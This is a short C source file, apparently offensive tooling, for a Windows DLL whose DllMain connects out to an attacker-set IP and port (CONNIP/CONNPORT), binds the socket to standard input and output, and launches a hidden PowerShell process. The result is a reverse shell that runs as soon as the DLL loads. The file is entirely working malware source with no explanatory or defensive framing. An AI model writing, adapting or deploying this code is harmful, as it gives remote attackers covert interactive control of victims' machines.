//AUTHOR :#Captain_Nemo

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include "mingwdll.h"

#define DEF_BUFF 2048

struct STRUCT_DLL struct_dll;

 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {
   while(1)
    {
        WSADATA wsaData;
        struct sockaddr_in address;
        //char Rec_dat[DEF_BUFF];
        STARTUPINFO process_startup;
        PROCESS_INFORMATION p_info;
        WSAStartup(MAKEWORD(2,2), &wsaData);
        struct_dll.Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
        address.sin_family = AF_INET;
        address.sin_port = htons(CONNPORT);
        address.sin_addr.s_addr =inet_addr(CONNIP);
        WSAConnect(struct_dll.Winsock,(SOCKADDR*)&address, sizeof(address),NULL,NULL,NULL,NULL); 
        if (WSAGetLastError() == 0)
         {
                memset(&process_startup, 0, sizeof(process_startup));
                char proc[] = "powershell.exe -WindowStyle Hidden";
                process_startup.cb=sizeof(process_startup);
                process_startup.dwFlags=STARTF_USESTDHANDLES;
                process_startup.hStdInput = process_startup.hStdOutput = process_startup.hStdError = (HANDLE)struct_dll.Winsock;
                CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &process_startup, &p_info);
                exit(0);
          }  // end if 
       exit(0);
     } // end while
   } // end dllmain
 
